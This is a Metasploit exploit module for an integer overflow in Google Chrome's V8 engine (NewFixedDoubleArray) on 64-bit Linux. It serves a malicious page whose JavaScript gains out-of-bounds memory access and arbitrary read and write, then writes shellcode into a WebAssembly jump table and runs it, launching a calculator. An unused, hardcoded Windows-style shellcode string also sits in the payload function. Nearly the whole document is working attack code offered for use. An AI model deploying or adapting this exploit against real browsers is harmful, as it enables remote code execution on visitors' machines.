##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::EXE
    include Msf::Exploit::RopDb
    include Msf::Exploit::Remote::BrowserAutopwn

    def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => "Google Chrome 72.0.3626.121 / 74.0.3725.0 - 'NewFixedDoubleArray' Integer Overflow",
            'Description'    => %q{
              Integer Overflow at NewFixedDoubleArray
              It was tested on Chrome Linux 74.0.3725.0 (Developer Build) (64-bit) on Ubuntu 16.04
            },
            'License'        => MSF_LICENSE,
            'Author'         => [
                'glazunov (Chrome Security Team @ Google)',       # Original RE research and exploitation
                'Youngjoon Kim <acorn421[at]gmail.com>'            # Metasploit module
              ],
            'Platform'       => 'linux',
            'Targets'        =>
              [
                [ 'Automatic', {} ],
                [ 'Chrome 74.0.3725.0 on Linux 64bit', { } ],
              ],
            'References'     =>
              [
                [ 'CVE', '2019-????' ],         # Unknown
                [ 'CBT', '1793' ],              # Chromium Bug Tracker (https://bugs.chromium.org/p/project-zero/issues/detail?id=1793)
                [ 'EBD', '46748' ]              # Exploit Database (https://www.exploit-db.com/exploits/46748)
              ],
            'Arch'           => ARCH_X86_64,
            'DisclosureDate' => "Mar 5 2019",
            'DefaultTarget'  => 0
          )
        )
    end

    # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3080.0 Safari/537.36
    def get_target(agent)
      return target if target.name != 'Automatic'
  
      li = agent.scan(/Linux ((x|i)\d+_*\d*)/).flatten[0] || ""
      cm = agent.scan(/Chrome\/(\d+.\d+.\d+.\d+)/).flatten[0] || ""
  
      cm_name = "Chrome #{cm}"

      case li
      when 'x86_64'
        os_name = 'Linux 64bit'
      when 'i686'
        os_name = 'Linux 32bit'
      end
  
      targets.each do |t|
        if (!cm.empty? && (!li.empty? && t.name.include?(os_name)))
        return t
        end
      end
  
      nil
    end
    
    def get_payload(t)
      # stack_pivot = "\x41\x42\x43\x44"
      # code        = payload.encoded
  
      # case t['Rop']
      # when :msvcrt
      #   print_status("Using msvcrt ROP")
      #   rop_payload = generate_rop_payload('msvcrt', code, 'pivot' => stack_pivot, 'target' => 'xp')
  
      # else
      #   print_status("Using JRE ROP")
      #   rop_payload = generate_rop_payload('java', code, 'pivot' => stack_pivot)
      # end
  
      # rop_payload
      rop_payload = "%u48fc%ue483%ue8f0%u00c0%u0000%u5141%u5041%u5152%u4856%ud231%u4865%u528b%u4860%u528b%u4818%u528b%u4820%u728b%u4850%ub70f%u4a4a%u314d%u48c9%uc031%u3cac%u7c61%u2c02%u4120%uc9c1%u410d%uc101%uede2%u4152%u4851%u528b%u8b20%u3c42%u0148%u8bd0%u8880%u0000%u4800%uc085%u6774%u0148%u50d0%u488b%u4418%u408b%u4920%ud001%u56e3%uff48%u41c9%u348b%u4888%ud601%u314d%u48c9%uc031%u41ac%uc9c1%u410d%uc101%ue038%uf175%u034c%u244c%u4508%ud139%ud875%u4458%u408b%u4924%ud001%u4166%u0c8b%u4448%u408b%u491c%ud001%u8b41%u8804%u0148%u41d0%u4158%u5e58%u5a59%u5841%u5941%u5a41%u8348%u20ec%u5241%ue0ff%u4158%u5a59%u8b48%ue912%uff57%uffff%u485d%u01ba%u0000%u0000%u0000%u4800%u8d8d%u0101%u0000%uba41%u8b31%u876f%ud5ff%uf0bb%ua2b5%u4156%ua6ba%ubd95%uff9d%u48d5%uc483%u3c28%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5900%u8941%uffda%u63d5%u6c61%u2e63%u7865%u0065"
      
      rop_payload
    end

    def get_html(t)
      js_p = get_payload(t)

      html = <<-HTML
      <body>
      <script>
      let data_view = new DataView(new ArrayBuffer(8));
      reverseDword = dword => {
        data_view.setUint32(0, dword, true);
        return data_view.getUint32(0, false);
      }
      
      reverseQword = qword => {
        data_view.setBigUint64(0, qword, true);
        return data_view.getBigUint64(0, false);
      }
      
      floatAsQword = float => {
        data_view.setFloat64(0, float);
        return data_view.getBigUint64(0);
      }
      
      qwordAsFloat = qword => {
        data_view.setBigUint64(0, qword);
        return data_view.getFloat64(0);
      }
      
      let oob_access_array;
      let ptr_leak_object;
      let arbirary_access_array;
      let ptr_leak_index;
      let external_ptr_index;
      let external_ptr_backup;
      const MARKER = 0x31337;
      
      leakPtr = obj => {
        ptr_leak_object[0] = obj;
        return floatAsQword(oob_access_array[ptr_leak_index]);
      }
      
      getQword = address => {
        oob_access_array[external_ptr_index] = qwordAsFloat(address);
        return arbirary_access_array[0];
        oob_access_array[external_ptr_index] = external_ptr_backup;
      }
      
      setQword = (address, value) => {
        oob_access_array[external_ptr_index] = qwordAsFloat(address);
        arbirary_access_array[0] = value;
        oob_access_array[external_ptr_index] = external_ptr_backup;
      }
      
      getField = (object_ptr, num, tagged = true) =>
        object_ptr + BigInt(num * 8 - (tagged ? 1 : 0));
      
      setBytes = (address, array) => {
        for (let i = 0; i < array.length; ++i) {
          setQword(address + BigInt(i), BigInt(array[i]));
        }
      }
      
      triggerOob = () => {
        array = [];
        array.length = 0xffffffff;
        ptr_leak_object = {};
        arbirary_access_array = new BigUint64Array(1);
      
        oob_access_array = array.fill(1.1, 0x80000000 - 1, {valueOf() {
          array.length = 32;
          array.fill(1.1);
          return 0x80000000;
        }});
        ptr_leak_object[0] = MARKER;
        arbirary_access_array.buffer;
      }
      
      findOffsets = () => {
        let markerAsFloat = qwordAsFloat(BigInt(MARKER) << 32n);
        for (ptr_leak_index = 0; ptr_leak_index < oob_access_array.length;
            ++ptr_leak_index) {
          if (oob_access_array[ptr_leak_index] === markerAsFloat) {
            break;
          }
        }
      
        let oneAsFloat = qwordAsFloat(1n << 32n);
        for (external_ptr_index = 2; external_ptr_index < oob_access_array.length;
            ++external_ptr_index) {
          if (oob_access_array[external_ptr_index - 2] === oneAsFloat &&
              oob_access_array[external_ptr_index - 1] === 0) {
            break;
          }
        }
      
        if (ptr_leak_index === oob_access_array.length ||
            external_ptr_index === oob_access_array.length) {
          throw alert("Couldn't locate the offsets");
        }
      
        external_ptr_backup = oob_access_array[external_ptr_index];
      }
      
      runCalc = () => {
        const wasm_code = new Uint8Array([
          0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
          0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
          0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
          0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,
          0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,
          0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,
          0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,
          0x00, 0x00, 0x41, 0x00, 0x0b
        ]);
        const wasm_instance = new WebAssembly.Instance(
          new WebAssembly.Module(wasm_code));
        const wasm_func = wasm_instance.exports.a;
      
        const shellcode = [
          0x48, 0x31, 0xf6, 0x56, 0x48, 0x8d, 0x3d, 0x32,
          0x00, 0x00, 0x00, 0x57, 0x48, 0x89, 0xe2, 0x56,
          0x48, 0x8d, 0x3d, 0x0c, 0x00, 0x00, 0x00, 0x57,
          0x48, 0x89, 0xe6, 0xb8, 0x3b, 0x00, 0x00, 0x00,
          0x0f, 0x05, 0xcc, 0x2f, 0x75, 0x73, 0x72, 0x2f,
          0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d,
          0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c,
          0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53,
          0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00
        ];
      
        wasm_instance_ptr = leakPtr(wasm_instance);
        console.log(wasm_instance_ptr);
        const jump_table = getQword(getField(wasm_instance_ptr, 33));
        console.log(jump_table);
      
        console.log(wasm_func);
      
        setBytes(jump_table, shellcode);
        wasm_func();
      }
      
      triggerOob();
      findOffsets();
      
      runCalc();
      </script>
      </body>
      HTML

      html.gsub(/^\t\t/, '')
    end

    def on_request_uri(cli, request)
        agent = request.headers['User-Agent']
        print_status("Requesting: #{request.uri}")

        target = get_target(agent)
        if target.nil?
        print_error("Browser not supported, sending 404: #{agent}")
        send_not_found(cli)
        return
        end

        print_status("Target selected as: #{target.name}")
        html = get_html(target)
        send_response(cli, html, 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache')
    end

end
